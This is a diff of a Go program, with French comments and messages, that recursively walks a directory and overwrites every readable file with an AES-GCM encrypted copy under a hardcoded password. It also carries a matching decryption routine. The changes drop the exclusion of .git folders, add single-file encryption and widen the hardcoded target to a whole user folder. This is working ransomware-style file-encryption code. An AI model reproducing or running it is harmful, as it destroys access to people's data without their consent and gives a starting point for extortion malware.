@@ -11,7 +11,14 @@ import (
     "io/ioutil"
     "strings"
     "os"
+    "crypto/sha1"
+    //"syscall"
+
 )
+
+
+
+
 
 func check(e error) {
     if e != nil {
@@ -19,7 +26,7 @@ func check(e error) {
     }
 }
 func chemin(path string,name string,isdir bool){
-        if(isdir && name!=".git"){
+        if(isdir ){
         path =path+name+"/"
 
         lister(path)
@@ -36,32 +43,32 @@ func ecrire(path string,name string,isdir bool,Mode os.FileMode){
             data, _ := ioutil.ReadFile(path+name)
        // ciphertext := encrypt([]byte("Hello World"), "password")
 
-   d2 := []byte(decrypt([]byte(data), "password"))
+   d2 := []byte(encrypt([]byte(data), "password"))
  
     err1 := ioutil.WriteFile(path+name, d2, 0644)
     check(err1)
     fmt.Println(path+name)
 	}
 
-
-/*
-      if(!isdir && (Mode==493 || Mode==420) ){
-    d1 := []byte("tests")
-
-    err := ioutil.WriteFile(path+name, d1, 0644)
-    check(err)
-    fmt.Println(path+name)
     }
-    */
-    }
+ 
 func createHash(key string) string {
     hasher := md5.New()
     hasher.Write([]byte(key))
     return hex.EncodeToString(hasher.Sum(nil))
 }
+func SHA1(data []byte) []byte {
 
+    h := sha1.New()
+
+    h.Write(data)
+
+    return h.Sum(nil)
+
+}
 func encrypt(data []byte, passphrase string) []byte {
     block, _ := aes.NewCipher([]byte(createHash(passphrase)))
+
     gcm, err := cipher.NewGCM(block)
     if err != nil {
         panic(err.Error())
@@ -92,21 +99,48 @@ func decrypt(data []byte, passphrase string) []byte {
     }
     return plaintext
 }
-func cut(path string) string {
+func getname_file(path string) string {
 
-   
+   path =strings.Trim(path,"/")
 
 
-    path=path[:strings.LastIndexAny(path, "/")+1]
+    path=path[strings.LastIndexAny(path, "/")+1:]
+
 
 
     return path
+}
+   func ecrire_dech(path string,name string,isdir bool,Mode os.FileMode){
+    fmt.Println(int(Mode),name)
+
+      if(!isdir && (Mode==493 || Mode==420) ){
+            data, _ := ioutil.ReadFile(path+name)
+       // ciphertext := encrypt([]byte("Hello World"), "password")
+
+   d2 := []byte(decrypt([]byte(data), "password"))
+ 
+    err1 := ioutil.WriteFile(path+name, d2, 0777)
+    check(err1)
+    fmt.Println(path+name)
+
+    }else if(Mode!=493){
+            if (Mode!=420 ){
+            
+        
+        fmt.Print("ce fichier")
+        fmt.Print(name)
+        fmt.Println("ne possède pas les droits en lectures /écritures")
+        }
+    }
 }
 func ecrire_encryption(path string,name string,isdir bool,Mode os.FileMode){
     fmt.Println(int(Mode),name)
 
       if(!isdir && (Mode==493 || Mode==420) ){
+               
+      
             data, _ := ioutil.ReadFile(path+name)
+
        // ciphertext := encrypt([]byte("Hello World"), "password")
 
    d2 := []byte(encrypt([]byte(data), "password"))
@@ -114,44 +148,84 @@ func ecrire_encryption(path string,name string,isdir bool,Mode os.FileMode){
     err1 := ioutil.WriteFile(path+name, d2, 0644)
     check(err1)
     fmt.Println(path+name)
-	}
+
+    }else if(Mode!=493){
+            if (Mode!=420 ){
+            
+        
+        fmt.Print("ce fichier")
+        fmt.Print(name)
+        fmt.Println("ne possède pas les droits en lectures /écritures")
+        }
+    }
+}
+func ecrire_encryption_file(name string,Mode os.FileMode){
+
+    fmt.Println(int(Mode),name)
+
+      if((Mode==493 || Mode==420) ){
+               
+      
+            data, _ := ioutil.ReadFile(name)
+
+       // ciphertext := encrypt([]byte("Hello World"), "password")
+
+   d2 := []byte(encrypt([]byte(data), "password"))
+ 
+    err1 := ioutil.WriteFile(name, d2, 0644)
+    check(err1)
+    fmt.Println(name)
+
+    }else if(Mode!=493){
+            if (Mode!=420 ){
+            
+        
+        fmt.Print("ce fichier")
+        fmt.Print(name)
+        fmt.Println("ne possède pas les droits en lectures /écritures")
+        }
+    }
 }	
 
 func lister(path string){
-        entries, err := ioutil.ReadDir(path)
+    
+    fi, err := os.Stat(path)
+    
+    if err != nil {
+        fmt.Println(err)
+        return
+    }
+    mode := fi.Mode();
+    //fmt.Println(mode.IsRegular())
+    if(mode.IsDir()==true){
+    	if(strings.LastIndexAny(path, "/") != len(path) - 1){
+        path=path+ string(os.PathSeparator)
+    }
+    
+   entries, err := ioutil.ReadDir(path)
          //path=strings.TrimRight(path,"/")
 
     if err != nil {
 
         fmt.Println(err)
     }
-    for i, entry := range entries {
-        /*
-    fmt.Println(entry.Name())    // Nom du fichier ("myphoto.jpg")
-    fmt.Println(entry.Size())    // Taille en octet (/1024 = Ko)
-    fmt.Println(entry.Mode())    // Droits d'écritures "-rw-rw-rw-"
-    fmt.Println(entry.ModTime()) // Date de dernière modification
-    fmt.Println(entry.IsDir())   // "false" par défaut (car on ne liste pas des "directories" / répertoires)
-    */
-    fmt.Println(i)
-    //fmt.Println(path+entry.Name())
-/*
-    if(!entry.IsDir() ){
-        //ciphertext := encrypt([]byte("Hello World"), "password")
-        data, _ := ioutil.ReadFile(path+entry.Name())
-    d1 := []byte(encrypt([]byte(data), "password"))
-    //d2 := []byte( decrypt(ciphertext, "password"))
-    err := ioutil.WriteFile(path+entry.Name(), d1, 0644)
-    check(err)
-    //err1 := ioutil.WriteFile(path+entry.Name(), d2, 0644)
-    //check(err1)
-    fmt.Println(path+entry.Name())
-    }
-    */
+    for _, entry := range entries {
+
+ 
    ecrire_encryption(path,entry.Name(),entry.IsDir(),entry.Mode()) 
 chemin(path,entry.Name(),entry.IsDir())
 
 }
+}else if(mode.IsRegular()==true){
+
+
+  ecrire_encryption_file(getname_file(path),mode) 
+
+    }
+
+
+
+       
 }
 func lister_dech(path string){
         entries, err := ioutil.ReadDir(path)
@@ -162,42 +236,10 @@ func lister_dech(path string){
         fmt.Println(err)
     }
     for _, entry := range entries {
-        /*
-    fmt.Println(entry.Name())    // Nom du fichier ("myphoto.jpg")
-    fmt.Println(entry.Size())    // Taille en octet (/1024 = Ko)
-    fmt.Println(entry.Mode())    // Droits d'écritures "-rw-rw-rw-"
-    fmt.Println(entry.ModTime()) // Date de dernière modification
-    fmt.Println(entry.IsDir())   // "false" par défaut (car on ne liste pas des "directories" / répertoires)
-    */
-    //fmt.Println(i)
-    //fmt.Println(path+entry.Name())
-/*
-    if(!entry.IsDir() && int(entry.Mode)==290 ){
-            
 
-        data, _ := ioutil.ReadFile(path+entry.Name())
-       // ciphertext := encrypt([]byte("Hello World"), "password")
-
-   d2 := []byte(decrypt([]byte(data), "password"))
- 
-    err1 := ioutil.WriteFile(path+entry.Name(), d2, 0644)
-    check(err1)
-    fmt.Println(path+entry.Name())
-    }
-    
-    
-    if(entry.IsDir()){
-        path =path+entry.Name()+"/"
-
-        lister(path)
-        //fmt.Println(path)
-        path=strings.TrimRight(path,"/")
-        path=strings.TrimRight(path,entry.Name())
-        //fmt.Println(path)
-    }
-    */
-        ecrire(path,entry.Name(),entry.IsDir(),entry.Mode())
+        ecrire_dech(path,entry.Name(),entry.IsDir(),entry.Mode())
     chemin(path,entry.Name(),entry.IsDir())
+   
 }
 
 
@@ -207,15 +249,9 @@ func give_me_the_name_of(path string){
 	        entries,_ := ioutil.ReadDir(path)
     for _, entry := range entries {
        
-    //fmt.Println(entry.Name())    // Nom du fichier ("myphoto.jpg")
-    //fmt.Println(entry.Size())    // Taille en octet (/1024 = Ko)
-    fmt.Printf("%d \n",entry.Mode())    // Droits d'écritures "-rw-rw-rw-"
-    //fmt.Println(entry.ModTime()) // Date de dernière modification
-    //fmt.Println(entry.IsDir())   // "false" par défaut (car on ne liste pas des "directories" / répertoires)
-   
-    //fmt.Println(i)
-    //fmt.Println(path+entry.Name())
 
+    fmt.Printf("%d \n",entry.Mode())    // Droits d'écritures "-rw-rw-rw-"
+ 
 
     
     
@@ -234,11 +270,20 @@ func give_me_the_name_of(path string){
 func main() {
 
 
-    path := "/home/user/Bureau/R/src/main/java/fr/uvsq/inf103/"
+    path := "/home/user/Bureau/R/"
+
+    
+    
 
     //give_me_the_name_of(path)
     //lister_dech(path)
     lister(path)
+    
+
+    
+
+
+
 
 
 }
